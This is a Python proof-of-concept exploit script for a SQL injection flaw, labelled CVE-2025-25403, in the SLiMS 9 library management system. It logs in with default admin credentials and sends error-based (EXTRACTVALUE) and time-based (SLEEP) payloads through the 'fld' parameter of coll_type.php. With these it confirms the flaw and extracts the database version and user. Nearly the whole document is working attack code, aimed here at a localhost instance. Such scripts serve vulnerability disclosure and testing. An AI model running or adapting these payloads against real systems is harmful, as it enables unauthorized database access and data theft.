#!/usr/bin/env python3
import requests
import re
import time
import sys

TARGET_URL = "http://localhost:8095/slims"
ADMIN_USER = "admin"
ADMIN_PASS = "admin"

def login(session, base_url, username, password):
    login_page_url = f"{base_url}/index.php?p=login"
    resp = session.get(login_page_url)
    
    csrf_match = re.search(r'name="_csrf_token_([a-f0-9]+)" value="([a-f0-9]+)"', resp.text)
    
    login_data = {
        "userName": username,
        "passWord": password,
        "logMeIn": "Login"
    }
    
    if csrf_match:
        csrf_name = f"_csrf_token_{csrf_match.group(1)}"
        csrf_value = csrf_match.group(2)
        login_data[csrf_name] = csrf_value
    
    resp = session.post(login_page_url, data=login_data, allow_redirects=True)
    
    return "admin_logged_in" in str(session.cookies.get_dict())

def test_time_based_sqli(session, base_url, delay=3):
    vuln_url = f"{base_url}/admin/modules/master_file/coll_type.php"
    
    payload = f"' OR SLEEP({delay})-- -"
    
    start_time = time.time()
    resp = session.get(vuln_url, params={"fld": payload, "dir": "1"}, timeout=delay+10)
    elapsed_time = time.time() - start_time
    
    return elapsed_time >= delay, elapsed_time

def test_error_based_sqli(session, base_url):
    vuln_url = f"{base_url}/admin/modules/master_file/coll_type.php"
    
    payload = "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- -"
    
    resp = session.get(vuln_url, params={"fld": payload, "dir": "1"})
    
    version_match = re.search(r'~([^~]+)~', resp.text)
    if version_match:
        return True, version_match.group(1)
    
    if 'XPATH syntax error' in resp.text:
        error_match = re.search(r"XPATH syntax error: '([^']+)'", resp.text)
        if error_match:
            return True, error_match.group(1)
    
    return False, None

def extract_current_user(session, base_url):
    vuln_url = f"{base_url}/admin/modules/master_file/coll_type.php"
    
    payload = "' AND EXTRACTVALUE(1,CONCAT(0x7e,USER(),0x7e))-- -"
    resp = session.get(vuln_url, params={"fld": payload, "dir": "1"})
    
    match = re.search(r'~([^~]+)~', resp.text)
    if match:
        return match.group(1)
    return None

def main():
    print("=" * 70)
    print("CVE-2025-25403 - SLiMS 9 Bulian V9.6.1 SQL Injection PoC")
    print("=" * 70)
    print(f"Target: {TARGET_URL}")
    print()
    
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    })
    
    print(f"[*] Logging in as {ADMIN_USER}...")
    if not login(session, TARGET_URL, ADMIN_USER, ADMIN_PASS):
        print("[-] Login failed!")
        return False
    print("[+] Login successful!")
    print()
    
    print("[*] Testing Error-Based SQL Injection...")
    error_vuln, db_version = test_error_based_sqli(session, TARGET_URL)
    if error_vuln:
        print(f"[+] VULNERABLE! Error-based SQLi confirmed")
        print(f"[+] EXTRACTED DATABASE VERSION: {db_version}")
    else:
        print("[-] Error-based SQLi not confirmed")
    print()
    
    print("[*] Testing Time-Based SQL Injection (3 second delay)...")
    time_vuln, elapsed = test_time_based_sqli(session, TARGET_URL, 3)
    if time_vuln:
        print(f"[+] VULNERABLE! Time-based SQLi confirmed (elapsed: {elapsed:.2f}s)")
    else:
        print(f"[-] Time-based test result: {elapsed:.2f}s")
    print()
    
    print("[*] Extracting current database user...")
    db_user = extract_current_user(session, TARGET_URL)
    if db_user:
        print(f"[+] CURRENT USER: {db_user}")
    print()
    
    print("=" * 70)
    print("SUMMARY:")
    print("=" * 70)
    print(f"  Vulnerable Endpoint: /admin/modules/master_file/coll_type.php")
    print(f"  Vulnerable Parameter: fld (GET)")
    print(f"  Error-based SQLi: {'CONFIRMED' if error_vuln else 'NOT CONFIRMED'}")
    print(f"  Time-based SQLi:  {'CONFIRMED' if time_vuln else 'NOT CONFIRMED'}")
    if db_version:
        print(f"  Database Version: {db_version}")
    if db_user:
        print(f"  Database User:    {db_user}")
    print()
    
    if error_vuln or time_vuln:
        print("[+] SQL INJECTION VULNERABILITY CONFIRMED!")
        return True
    else:
        print("[-] Could not confirm vulnerability")
        return False

if __name__ == "__main__":
    try:
        success = main()
        sys.exit(0 if success else 1)
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)
